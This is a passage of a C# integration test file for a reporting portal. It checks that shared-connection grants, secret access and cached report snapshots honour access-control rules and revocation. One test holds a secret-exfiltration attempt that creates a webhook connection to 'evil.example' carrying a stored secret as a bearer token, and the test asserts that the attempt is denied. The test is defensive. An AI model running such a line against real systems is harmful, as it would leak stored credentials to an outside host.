        Assert.DoesNotContain("restricted-secret-path", directAttempt.ErrorMessage ?? string.Empty, StringComparison.Ordinal);

        // Ungranted SHARED: fails; once granted via group, SHARED: succeeds while direct SECRET: stays denied.
        var sharedWithoutGrant = await executor.ExecuteTextAsync(
            "CREATE CONNECTION allowed_conn AS WEBHOOK('SHARED:restricted_webhook');",
            Guid.NewGuid().ToString("N"),
            CancellationToken.None,
            executionIdentity: nonAdminIdentity);
        Assert.False(sharedWithoutGrant.Success);

        var grpRes = await SendAsync(client, HttpMethod.Post, token, "/api/admin/groups", new { name = "SecretBypassCheckGroup" });
        Assert.Equal(HttpStatusCode.Created, grpRes.StatusCode);
        var grpId = (await grpRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        var grpEtag = grpRes.Headers.ETag?.ToString() ?? "\"1\"";
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, token, $"/api/admin/groups/{grpId}/members", new { userId }, grpEtag)).StatusCode);
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, token, "/api/admin/connections/restricted_webhook/acl", new { groupId = grpId })).StatusCode);

        var grantedIdentity = nonAdminIdentity with { Groups = ["SecretBypassCheckGroup"] };
        var sharedWithGrant = await executor.ExecuteTextAsync(
            "CREATE CONNECTION allowed_conn AS WEBHOOK('SHARED:restricted_webhook');",
            Guid.NewGuid().ToString("N"),
            CancellationToken.None,
            executionIdentity: grantedIdentity);
        Assert.True(sharedWithGrant.Success, sharedWithGrant.ErrorMessage);

        var directAfterGrant = await executor.ExecuteTextAsync(
            "CREATE CONNECTION hijack2 AS WEBHOOK('https://evil.example/hook2', BEARER_TOKEN = 'SECRET:portal_webhook_secret');",
            Guid.NewGuid().ToString("N"),
            CancellationToken.None,
            executionIdentity: grantedIdentity);
        Assert.False(directAfterGrant.Success);
    }

    [Fact]
    [Trait("CompatBreak", "0.23")]
    public async Task CachedReportSnapshot_RequiresSharedConnectionUsePermission()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var adminToken = await GetAdminTokenAsync(client);

        // Create an ACL-restricted SHARED: MOCKDB connection (owned by admin, no grants initially).
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, adminToken, "/api/admin/connections/restricted_snap_db", new
            {
                connectorType = "MOCKDB",
                options = new Dictionary<string, string>()
            })).StatusCode);

        // Create two Viewers: alice (in Finance group) and bob (not in Finance group).
        var (aliceId, aliceUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "snapalice", "Viewer");
        var (bobId, bobUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "snapbob", "Viewer");

        var grpRes = await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/groups", new { name = "SnapFinance" });
        Assert.Equal(HttpStatusCode.Created, grpRes.StatusCode);
        var grpId = (await grpRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        var grpEtag = grpRes.Headers.ETag?.ToString() ?? "\"1\"";
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, adminToken, $"/api/admin/groups/{grpId}/members", new { userId = aliceId }, grpEtag)).StatusCode);

        // Create a shared folder readable by both alice and bob via SnapReaders group.
        var readersGrpRes = await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/groups", new { name = "SnapReaders" });
        Assert.Equal(HttpStatusCode.Created, readersGrpRes.StatusCode);
        var readersGrpId = (await readersGrpRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        var readersEtag = readersGrpRes.Headers.ETag?.ToString() ?? "\"1\"";
        var addAliceRes = await SendAsync(client, HttpMethod.Post, adminToken, $"/api/admin/groups/{readersGrpId}/members", new { userId = aliceId }, readersEtag);
        Assert.Equal(HttpStatusCode.OK, addAliceRes.StatusCode);
        readersEtag = addAliceRes.Headers.ETag?.ToString() ?? "\"2\"";
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, adminToken, $"/api/admin/groups/{readersGrpId}/members", new { userId = bobId }, readersEtag)).StatusCode);

        var folderRes = await SendAsync(client, HttpMethod.Post, adminToken, "/api/folders", new { name = "SharedSnapFolder" });
        Assert.Equal(HttpStatusCode.Created, folderRes.StatusCode);
        var folderJson = await folderRes.Content.ReadFromJsonAsync<JsonObject>(Json);
        var folderId = folderJson!["id"]!.GetValue<int>();
        var folderEtag = folderRes.Headers.ETag?.ToString() ?? "\"1\"";
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, adminToken, $"/api/folders/{folderId}/acl", new
            {
                groupId = readersGrpId,
                permission = FolderPermission.Read
            }, folderEtag)).StatusCode);

        // Grant SnapFinance Use permission on restricted_snap_db.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/connections/restricted_snap_db/acl", new { groupId = grpId })).StatusCode);

        // Log in after group and folder ACL assignments so JWT SecurityStamps are current.
        var aliceToken = (await LoginAsync(client, aliceUsername, "User@Test2!")).AccessToken;
        var bobToken = (await LoginAsync(client, bobUsername, "User@Test2!")).AccessToken;

        // Create report referencing SHARED:restricted_snap_db and build its cached snapshot as admin.
        var scriptPath = Path.Combine(factory.TempDir, "scripts", $"snap_acl_{Guid.NewGuid():N}.rptsql");
        Directory.CreateDirectory(Path.GetDirectoryName(scriptPath)!);
        await File.WriteAllTextAsync(scriptPath, """
            CREATE CONNECTION dw AS MOCKDB('SHARED:restricted_snap_db');
            CREATE VISUAL Summary AS CARD (
              SOURCE = (SELECT 42 AS Answer),
              MAPPINGS (VALUE = Answer)
            );
            """);

        int reportId;
        using (var scope = factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
            var adminUser = await db.Users.SingleAsync(u => u.UserName == "admin");
            var report = new Report
            {
                FolderId = folderId,
                Name = "RestrictedSnapshotReport",
                ScriptPath = scriptPath,
                ScriptLastModified = DateTime.UtcNow,
                CreatedBy = adminUser.Id
            };
            db.Reports.Add(report);
            await db.SaveChangesAsync();
            reportId = report.Id;

            var manifestKey = $"report_{reportId}_test.etlsnap";
            await scope.ServiceProvider.GetRequiredService<SnapshotPackageService>().SaveAsync(new ETL_SQL.Reporting.ReportManifest
            {
                Source = scriptPath,
                Title = "RestrictedSnapshotReport",
                Visuals =
                {
                    new ETL_SQL.Reporting.VisualManifest
                    {
                        Name = "Summary",
                        VisualType = "TABLE",
                        Columns = ["Answer"],
                        Rows = [["42"]]
                    }
                }
            }, manifestKey);

            db.ReportSnapshots.Add(new ReportSnapshot
            {
                ReportId = reportId,
                ManifestPath = manifestKey,
                ScriptHashAtRunTime = "sha256:" + Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(await File.ReadAllBytesAsync(scriptPath))).ToLowerInvariant(),
                BuiltAt = DateTime.UtcNow,
                BuiltBy = adminUser.Id
            });
            await db.SaveChangesAsync();
        }

        // Bob has Folder Read but NO connection Use -> 403 Forbidden on all snapshot routes.
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/snapshot?includeManifest=true", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/manifest", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/snapshot/manifest", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/snapshot/rows/0", null)).StatusCode);

        foreach (var route in new[] { "snapshot/rows/0.arrow", "export/csv", "export/xlsx", "export/pdf" })
            Assert.Equal(HttpStatusCode.Forbidden,
                (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/{route}", null)).StatusCode);

        // Alice is in SnapFinance (has Use) -> 200 OK on snapshot and manifest.
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Get, aliceToken, $"/api/reports/{reportId}/snapshot?includeManifest=true", null)).StatusCode);
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Get, aliceToken, $"/api/reports/{reportId}/manifest", null)).StatusCode);

        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Get, aliceToken, $"/api/reports/{reportId}/export/csv", null)).StatusCode);

        // Editing or deleting today's source must not make the older restricted data public.
        var originalScript = await File.ReadAllTextAsync(scriptPath);
        await File.WriteAllTextAsync(scriptPath, "PRINT 'No connection references';");
        foreach (var route in new[] { "snapshot?includeManifest=true", "manifest", "snapshot/manifest", "snapshot/rows/0", "snapshot/rows/0.arrow", "export/csv", "export/xlsx" })
            Assert.Equal(HttpStatusCode.Forbidden,
                (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/{route}", null)).StatusCode);
        File.Delete(scriptPath);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, bobToken, $"/api/reports/{reportId}/manifest", null)).StatusCode);
        await File.WriteAllTextAsync(scriptPath, originalScript);

        // Revoking SnapFinance's Use grant immediately blocks Alice from the cached snapshot.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, adminToken, $"/api/admin/connections/restricted_snap_db/acl/{grpId}", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, aliceToken, $"/api/reports/{reportId}/snapshot", null)).StatusCode);
        Assert.Equal(HttpStatusCode.Forbidden,
            (await SendAsync(client, HttpMethod.Get, aliceToken, $"/api/reports/{reportId}/manifest", null)).StatusCode);
    }

    [Fact]
    [Trait("CompatBreak", "0.23")]
    public async Task RecordedSnapshotDependencies_SurviveSourceEditsAndRemoval_AndEnforceGrantRevocation()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var adminToken = await GetAdminTokenAsync(client);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, adminToken, "/api/admin/connections/recorded_snap_db", new
            {
                connectorType = "MOCKDB",
                options = new Dictionary<string, string>()
            })).StatusCode);

        var (aliceId, aliceUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "recalice", "Publisher");
        var (bobId, bobUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "recbob", "Viewer");

        var (grpId, _) = await CreateGroupWithMembersAsync(client, adminToken, "RecFinance", aliceId);
        var (_, _) = await CreateGroupWithMembersAsync(client, adminToken, "RecReaders", aliceId, bobId);

        var folderId = await CreateReadableFolderAsync(client, adminToken, "RecordedSnapFolder", "RecReaders");
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/connections/recorded_snap_db/acl", new { groupId = grpId })).StatusCode);

        var aliceToken = (await LoginAsync(client, aliceUsername, "User@Test2!")).AccessToken;
        var bobToken = (await LoginAsync(client, bobUsername, "User@Test2!")).AccessToken;

        var scriptPath = Path.Combine(factory.TempDir, "scripts", $"recorded_snap_{Guid.NewGuid():N}.rptsql");
        Directory.CreateDirectory(Path.GetDirectoryName(scriptPath)!);
        await File.WriteAllTextAsync(scriptPath, """
            CREATE CONNECTION dw AS MOCKDB('SHARED:recorded_snap_db');
            CREATE VISUAL Summary AS TABLE (
              SOURCE = (SELECT 42 AS Answer),
              MAPPINGS (Answer = Answer)
            );
            """);

        var reportId = await CreateReportAndRefreshAsync(factory, client, adminToken, folderId, "RecordedSnapshotReport", scriptPath);
        await AssertRecordedDependenciesAsync(factory, reportId, ["recorded_snap_db"]);

        // Bob lacks Use -> 403 Forbidden on every snapshot and export route.
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: true);
        // Alice has Use -> authorized on all snapshot, export, and designer snapshot routes.
        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: true, includeDesigner: true);

        // Editing today's source (removing SHARED:) keeps the stale snapshot usable for Alice without leaking to Bob.
        await File.WriteAllTextAsync(scriptPath, """
            CREATE VISUAL Summary AS TABLE (
              SOURCE = (SELECT 99 AS Answer),
              MAPPINGS (Answer = Answer)
            );
            """);
        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: false, includeDesigner: true);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Removing the source file still allows Alice to read/export the recorded snapshot while blocking Bob.
        File.Delete(scriptPath);
        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: false, includeDesigner: true);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Revoking the recorded alias grant immediately blocks Alice across all routes.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, adminToken, $"/api/admin/connections/recorded_snap_db/acl/{grpId}", null)).StatusCode);
        await AssertAllSnapshotRoutesDeniedAsync(client, aliceToken, reportId, includePdf: false, includeDesigner: true);
    }

    [Fact]
    [Trait("CompatBreak", "0.23")]
    public async Task ParameterizedSharedConnection_IsRecordedWithSnapshot_AndEnforcedOnAllRoutes()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var adminToken = await GetAdminTokenAsync(client);

        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Put, adminToken, "/api/admin/connections/recorded_dyn_db", new
            {
                connectorType = "MOCKDB",
                options = new Dictionary<string, string>()
            })).StatusCode);

        var (aliceId, aliceUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "dynalice", "Viewer");
        var (bobId, bobUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "dynbob", "Viewer");

        var (dynGrpId, _) = await CreateGroupWithMembersAsync(client, adminToken, "DynGroup", aliceId);
        await CreateGroupWithMembersAsync(client, adminToken, "DynReaders", aliceId, bobId);

        var folderId = await CreateReadableFolderAsync(client, adminToken, "DynamicSnapFolder", "DynReaders");
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/connections/recorded_dyn_db/acl", new { groupId = dynGrpId })).StatusCode);

        var aliceToken = (await LoginAsync(client, aliceUsername, "User@Test2!")).AccessToken;
        var bobToken = (await LoginAsync(client, bobUsername, "User@Test2!")).AccessToken;

        var scriptPath = Path.Combine(factory.TempDir, "scripts", $"dyn_snap_{Guid.NewGuid():N}.rptsql");
        Directory.CreateDirectory(Path.GetDirectoryName(scriptPath)!);
        await File.WriteAllTextAsync(scriptPath, """
            DECLARE @env VARCHAR = 'recorded_dyn_db';
            CREATE CONNECTION dyn_dw AS MOCKDB('SHARED:' + @env);
            CREATE VISUAL Summary AS TABLE (
              SOURCE = (SELECT 42 AS Answer),
              MAPPINGS (Answer = Answer)
            );
            """);

        var reportId = await CreateReportAndRefreshAsync(factory, client, adminToken, folderId, "DynamicSnapshotReport", scriptPath);
        await AssertRecordedDependenciesAsync(factory, reportId, ["recorded_dyn_db"]);

        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: true, includeDesigner: false);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Removing the source file keeps the recorded snapshot usable for Alice without exposing it to Bob.
        File.Delete(scriptPath);
        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: true, includeDesigner: false);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Revoking the recorded dependency blocks Alice immediately.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, adminToken, $"/api/admin/connections/recorded_dyn_db/acl/{dynGrpId}", null)).StatusCode);
        await AssertAllSnapshotRoutesDeniedAsync(client, aliceToken, reportId, includePdf: false);
    }

    [Fact]
    [Trait("CompatBreak", "0.23")]
    public async Task NestedRunScriptSharedConnections_AreCapturedAtExecution_AndEnforcedWhenPersisted()
    {
        using var factory = new CatalogFactory();
        using var client = factory.CreateClient();
        var adminToken = await GetAdminTokenAsync(client);

        foreach (var alias in new[] { "nested_parent_db", "nested_child_db" })
        {
            Assert.Equal(HttpStatusCode.NoContent,
                (await SendAsync(client, HttpMethod.Put, adminToken, $"/api/admin/connections/{alias}", new
                {
                    connectorType = "MOCKDB",
                    options = new Dictionary<string, string>()
                })).StatusCode);
        }

        var (aliceId, aliceUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "nestalice", "Viewer");
        var (bobId, bobUsername) = await CreateReadyUserWithNameAsync(client, adminToken, "nestbob", "Viewer");

        var (parentGrpId, _) = await CreateGroupWithMembersAsync(client, adminToken, "NestParentGroup", aliceId);
        var (childGrpId, _) = await CreateGroupWithMembersAsync(client, adminToken, "NestChildGroup", aliceId);
        await CreateGroupWithMembersAsync(client, adminToken, "NestReaders", aliceId, bobId);

        var folderId = await CreateReadableFolderAsync(client, adminToken, "NestedSnapFolder", "NestReaders");
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/connections/nested_parent_db/acl", new { groupId = parentGrpId })).StatusCode);

        var aliceToken = (await LoginAsync(client, aliceUsername, "User@Test2!")).AccessToken;
        var bobToken = (await LoginAsync(client, bobUsername, "User@Test2!")).AccessToken;

        var scriptsDir = Path.Combine(factory.TempDir, "scripts");
        Directory.CreateDirectory(scriptsDir);
        var nestedPath = Path.Combine(scriptsDir, $"nested_conn_{Guid.NewGuid():N}.etlsql");
        await File.WriteAllTextAsync(nestedPath, "CREATE CONNECTION sub_dw AS MOCKDB('SHARED:nested_child_db');");

        var mainScriptPath = Path.Combine(scriptsDir, $"nested_snap_{Guid.NewGuid():N}.rptsql");
        await File.WriteAllTextAsync(mainScriptPath, $$"""
            DECLARE @env VARCHAR = 'nested_parent_db';
            CREATE CONNECTION parent_dw AS MOCKDB('SHARED:' + @env);
            RUN SCRIPT '{{Path.GetFileName(nestedPath)}}';
            CREATE VISUAL Summary AS TABLE (
              SOURCE = (SELECT 42 AS Answer),
              MAPPINGS (Answer = Answer)
            );
            """);

        // Build through DashboardService as admin and capture its recorded dependencies (including nested RUN SCRIPT).
        int reportId;
        using (var scope = factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
            var adminUser = await db.Users.SingleAsync(u => u.UserName == "admin");
            var identity = await scope.ServiceProvider.GetRequiredService<PortalExecutionIdentityService>()
                .BuildAsync(adminUser.Id, "portal-host", isAdministrator: true, impersonatedUserId: null, CancellationToken.None);

            await using var dashboard = new ETL_SQL.ReportHosting.DashboardService(
                mainScriptPath,
                factory.Services.GetRequiredService<IServiceScopeFactory>(),
                executionIdentity: identity);
            var manifest = await dashboard.RebuildAsync(CancellationToken.None);
            Assert.Null(manifest.Error);
            var recorded = dashboard.CurrentSharedConnectionDependencies;
            Assert.Equal(["nested_child_db", "nested_parent_db"], recorded);

            var report = new Report
            {
                FolderId = folderId,
                Name = "NestedSnapshotReport",
                ScriptPath = mainScriptPath,
                ScriptLastModified = DateTime.UtcNow,
                CreatedBy = adminUser.Id
            };
            db.Reports.Add(report);
            await db.SaveChangesAsync();
            reportId = report.Id;

            var manifestKey = $"report_{reportId}_nested.etlsnap";
            await scope.ServiceProvider.GetRequiredService<SnapshotPackageService>().SaveAsync(manifest, manifestKey);
            db.ReportSnapshots.Add(new ReportSnapshot
            {
                ReportId = reportId,
                ManifestPath = manifestKey,
                BuiltAt = DateTime.UtcNow,
                BuiltBy = adminUser.Id,
                SharedConnectionDependenciesJson = JsonSerializer.Serialize(recorded)
            });
            await db.SaveChangesAsync();
        }

        // Remove the RUN SCRIPT parent/child files so snapshot serving applies instead of live-session RUN SCRIPT fallback.
        File.Delete(nestedPath);
        File.Delete(mainScriptPath);

        // Alice only has nested_parent_db initially (missing nested_child_db from the nested script) -> denied everywhere.
        await AssertAllSnapshotRoutesDeniedAsync(client, aliceToken, reportId, includePdf: false);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Grant nested_child_db too -> Alice succeeds across every snapshot and export route even with sources deleted.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/connections/nested_child_db/acl", new { groupId = childGrpId })).StatusCode);
        await AssertAllSnapshotRoutesAllowedAsync(client, aliceToken, reportId, includePdf: true, includeDesigner: false);
        await AssertAllSnapshotRoutesDeniedAsync(client, bobToken, reportId, includePdf: false);

        // Revoking the nested alias blocks Alice immediately.
        Assert.Equal(HttpStatusCode.NoContent,
            (await SendAsync(client, HttpMethod.Delete, adminToken, $"/api/admin/connections/nested_child_db/acl/{childGrpId}", null)).StatusCode);
        await AssertAllSnapshotRoutesDeniedAsync(client, aliceToken, reportId, includePdf: false);
    }

    private static async Task<(int GroupId, string ETag)> CreateGroupWithMembersAsync(
        HttpClient client, string adminToken, string name, params int[] userIds)
    {
        var grpRes = await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/groups", new { name });
        Assert.Equal(HttpStatusCode.Created, grpRes.StatusCode);
        var grpId = (await grpRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        var etag = grpRes.Headers.ETag?.ToString() ?? "\"1\"";
        foreach (var userId in userIds)
        {
            var addRes = await SendAsync(client, HttpMethod.Post, adminToken, $"/api/admin/groups/{grpId}/members", new { userId }, etag);
            Assert.Equal(HttpStatusCode.OK, addRes.StatusCode);
            etag = addRes.Headers.ETag?.ToString() ?? etag;
        }
        return (grpId, etag);
    }

    private static async Task<int> CreateReadableFolderAsync(
        HttpClient client, string adminToken, string folderName, string readersGroupName)
    {
        var groupsRes = await SendAsync(client, HttpMethod.Get, adminToken, "/api/admin/groups", null);
        Assert.Equal(HttpStatusCode.OK, groupsRes.StatusCode);
        var groups = await groupsRes.Content.ReadFromJsonAsync<JsonArray>(Json);
        var readersGrpId = groups!
            .Select(node => node!.AsObject())
            .Single(g => string.Equals(g["name"]!.GetValue<string>(), readersGroupName, StringComparison.Ordinal))["id"]!
            .GetValue<int>();

        var folderRes = await SendAsync(client, HttpMethod.Post, adminToken, "/api/folders", new { name = folderName });
        Assert.Equal(HttpStatusCode.Created, folderRes.StatusCode);
        var folderId = (await folderRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();
        var folderEtag = folderRes.Headers.ETag?.ToString() ?? "\"1\"";
        Assert.Equal(HttpStatusCode.OK,
            (await SendAsync(client, HttpMethod.Post, adminToken, $"/api/folders/{folderId}/acl", new
            {
                groupId = readersGrpId,
                permission = FolderPermission.Read
            }, folderEtag)).StatusCode);
        return folderId;
    }

    private static async Task<int> CreateReportAndRefreshAsync(
        CatalogFactory factory,
        HttpClient client,
        string adminToken,
        int folderId,
        string reportName,
        string scriptPath)
    {
        int reportId;
        using (var scope = factory.Services.CreateScope())
        {
            var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
            var adminUser = await db.Users.SingleAsync(u => u.UserName == "admin");
            var report = new Report
            {
                FolderId = folderId,
                Name = reportName,
                ScriptPath = scriptPath,
                ScriptLastModified = DateTime.UtcNow,
                CreatedBy = adminUser.Id
            };
            db.Reports.Add(report);
            await db.SaveChangesAsync();
            reportId = report.Id;
        }

        var refreshRes = await SendAsync(client, HttpMethod.Post, adminToken, $"/api/reports/{reportId}/refresh", new { });
        Assert.Equal(HttpStatusCode.Accepted, refreshRes.StatusCode);
        var jobId = (await refreshRes.Content.ReadFromJsonAsync<JsonObject>(Json))!["jobId"]!.GetValue<string>();

        var deadline = DateTime.UtcNow.AddSeconds(30); // flaky-wait-budget-ok: hang guard; the loop exits on the observed terminal job status
        while (DateTime.UtcNow < deadline)
        {
            var jobRes = await SendAsync(client, HttpMethod.Get, adminToken, $"/api/jobs/{jobId}", null);
            Assert.Equal(HttpStatusCode.OK, jobRes.StatusCode);
            var job = await jobRes.Content.ReadFromJsonAsync<JsonObject>(Json);
            var status = job!["status"]!.GetValue<string>();
            if (status == "Completed")
                return reportId;
            if (status is "Failed" or "Cancelled")
                throw new InvalidOperationException($"Report refresh failed: {job.ToJsonString()}");
            await Task.Delay(100);
        }

        throw new TimeoutException($"Report refresh job {jobId} did not complete in time.");
    }

    private static async Task AssertRecordedDependenciesAsync(
        CatalogFactory factory, int reportId, string[] expectedAliases)
    {
        using var scope = factory.Services.CreateScope();
        var db = scope.ServiceProvider.GetRequiredService<PortalDbContext>();
        var snapshot = await db.ReportSnapshots
            .Where(s => s.ReportId == reportId)
            .OrderByDescending(s => s.BuiltAt)
            .FirstOrDefaultAsync();
        Assert.NotNull(snapshot);
        Assert.NotNull(snapshot!.SharedConnectionDependenciesJson);
        var recorded = JsonSerializer.Deserialize<string[]>(snapshot.SharedConnectionDependenciesJson!);
        Assert.NotNull(recorded);
        Assert.Equal(expectedAliases.OrderBy(a => a, StringComparer.OrdinalIgnoreCase),
            recorded!.OrderBy(a => a, StringComparer.OrdinalIgnoreCase),
            StringComparer.OrdinalIgnoreCase);
    }

    private static async Task AssertAllSnapshotRoutesAllowedAsync(
        HttpClient client, string token, int reportId, bool includePdf, bool includeDesigner)
    {
        foreach (var route in new[] { "snapshot?includeManifest=true", "manifest", "snapshot/manifest", "export/csv", "export/xlsx" })
            Assert.Equal(HttpStatusCode.OK,
                (await SendAsync(client, HttpMethod.Get, token, $"/api/reports/{reportId}/{route}", null)).StatusCode);

        // Small inline visuals pass the ACL gate and return 404 when no separate offloaded row artifact exists.
        foreach (var route in new[] { "snapshot/rows/0", "snapshot/rows/0.arrow" })
        {
            var status = (await SendAsync(client, HttpMethod.Get, token, $"/api/reports/{reportId}/{route}", null)).StatusCode;
            Assert.True(status is HttpStatusCode.OK or HttpStatusCode.NotFound,
                $"Expected OK or NotFound on /api/reports/{reportId}/{route}, got {status}");
        }

        if (includePdf)
            Assert.Equal(HttpStatusCode.OK,
                (await SendAsync(client, HttpMethod.Get, token, $"/api/reports/{reportId}/export/pdf", null)).StatusCode);

        if (includeDesigner)
            Assert.Equal(HttpStatusCode.OK,
                (await SendAsync(client, HttpMethod.Get, token, $"/api/designer/snapshot/{reportId}", null)).StatusCode);
    }

    private static async Task AssertAllSnapshotRoutesDeniedAsync(
        HttpClient client, string token, int reportId, bool includePdf, bool includeDesigner = false)
    {
        var routes = new List<string>
        {
            "snapshot?includeManifest=true",
            "manifest",
            "snapshot/manifest",
            "snapshot/rows/0",
            "snapshot/rows/0.arrow",
            "export/csv",
            "export/xlsx"
        };
        if (includePdf)
            routes.Add("export/pdf");

        foreach (var route in routes)
            Assert.Equal(HttpStatusCode.Forbidden,
                (await SendAsync(client, HttpMethod.Get, token, $"/api/reports/{reportId}/{route}", null)).StatusCode);

        if (includeDesigner)
            Assert.Equal(HttpStatusCode.Forbidden,
                (await SendAsync(client, HttpMethod.Get, token, $"/api/designer/snapshot/{reportId}", null)).StatusCode);
    }

    private sealed class CatalogFactory : PortalWebFactory
    {
        protected override void CustomizeConfiguration(Dictionary<string, string?> settings)
        {
            settings["Governance:Secrets:Provider"] = "PortalStore";
            settings["Governance:ConnectionCatalog:Provider"] = "Portal";
        }
    }

    private static async Task<string> GetAdminTokenAsync(HttpClient client)
    {
        var initial = await LoginAsync(client, "admin", "Admin@12345!");
        var change = await SendAsync(client, HttpMethod.Post, initial.AccessToken, "/api/auth/change-password",
            new { currentPassword = "Admin@12345!", newPassword = "Admin@Tests99!" });
        Assert.Equal(HttpStatusCode.NoContent, change.StatusCode);
        return (await LoginAsync(client, "admin", "Admin@Tests99!")).AccessToken;
    }

    private static async Task<(string AccessToken, string RefreshToken)> LoginAsync(
        HttpClient client, string username, string password)
    {
        var response = await client.PostAsJsonAsync("/api/auth/login", new { username, password });
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);
        var body = await response.Content.ReadFromJsonAsync<JsonObject>(Json);
        return (body!["token"]!.GetValue<string>(), body["refreshToken"]!.GetValue<string>());
    }

    private static async Task<(int UserId, string AccessToken)> CreateReadyUserAsync(
        HttpClient client,
        string adminToken,
        string usernamePrefix,
        string role)
    {
        var (userId, username) = await CreateReadyUserWithNameAsync(client, adminToken, usernamePrefix, role);
        return (userId, (await LoginAsync(client, username, "User@Test2!")).AccessToken);
    }

    private static async Task<(int UserId, string Username)> CreateReadyUserWithNameAsync(
        HttpClient client,
        string adminToken,
        string usernamePrefix,
        string role)
    {
        var username = $"{usernamePrefix}_{Guid.NewGuid():N}"[..20];
        const string initialPassword = "User@Test1!";
        const string changedPassword = "User@Test2!";
        var create = await SendAsync(client, HttpMethod.Post, adminToken, "/api/admin/users", new
        {
            username,
            email = $"{username}@test.local",
            password = initialPassword,
            role
        });
        Assert.Equal(HttpStatusCode.Created, create.StatusCode);
        var userId = (await create.Content.ReadFromJsonAsync<JsonObject>(Json))!["id"]!.GetValue<int>();

        var initial = await LoginAsync(client, username, initialPassword);
        var change = await SendAsync(client, HttpMethod.Post, initial.AccessToken, "/api/auth/change-password", new
        {
            currentPassword = initialPassword,
            newPassword = changedPassword
        });
        Assert.Equal(HttpStatusCode.NoContent, change.StatusCode);

        return (userId, username);
    }

    private static async Task<HttpResponseMessage> SendAsync(HttpClient client, HttpMethod method,
        string token, string url, object? body, string? ifMatch = null)
    {
        var request = new HttpRequestMessage(method, url);
        request.Headers.Authorization = new("Bearer", token);
        if (!string.IsNullOrWhiteSpace(ifMatch))
            request.Headers.TryAddWithoutValidation("If-Match", ifMatch);
        if (body is not null) request.Content = JsonContent.Create(body);
